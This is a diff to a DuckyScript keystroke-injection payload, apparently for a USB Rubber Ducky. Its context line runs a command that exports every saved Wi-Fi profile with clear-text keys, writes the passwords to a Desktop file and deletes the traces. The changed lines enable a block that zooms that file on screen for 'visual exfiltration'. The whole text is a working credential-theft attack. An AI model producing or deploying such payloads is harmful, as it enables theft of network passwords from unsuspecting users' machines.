@@ -12,20 +12,19 @@ ENTER
 DELAY 500
 STRING cd Desktop;netsh wlan export profile key=clear;Select-String -Path Wi-Fi-* -Pattern 'keyMaterial'>0.txt;del Wi-Fi-*;exit
 ENTER
-REM If you want to zoom pop-up at the end for visual exfiltration replace "REMoption1" with nothing
-REMoption1 GUI m
-REMoption1 DELAY 4000
-REMoption1 STRING 0
-REMoption1 DELAY 100
-REMoption1 ENTER
-REMoption1 DELAY 200
-REMoption1 GUI UPARROW
-REMoption1 DELAY 100
-REMoption1 CTRL =
-REMoption1 CTRL =
-REMoption1 CTRL =
-REMoption1 CTRL =
-REMoption1 CTRL =
-REMoption1 DELAY 10000
-REMoption1 ALT F4
-REMoption1 CTRL D
+GUI m
+DELAY 4000
+STRING 0
+DELAY 100
+ENTER
+DELAY 200
+GUI UPARROW
+DELAY 100
+CTRL =
+CTRL =
+CTRL =
+CTRL =
+CTRL =
+DELAY 10000
+ALT F4
+CTRL D
